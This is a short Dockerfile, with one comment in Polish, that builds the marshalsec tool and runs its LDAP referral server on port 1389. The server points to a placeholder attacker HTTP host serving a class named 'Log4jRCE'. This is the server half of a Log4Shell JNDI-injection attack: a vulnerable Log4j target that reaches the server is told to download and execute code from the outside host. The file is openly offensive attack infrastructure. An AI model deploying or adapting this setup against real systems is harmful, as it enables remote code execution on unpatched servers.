FROM maven:3.6.2-jdk-8

WORKDIR /data

COPY . .

RUN mvn clean package -DskipTests

# Gdzie jest hostowana nasza clasa (ip i port codehttp)
CMD java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://TODO_IPADDR:PORT/#Log4jRCE"
EXPOSE 1389


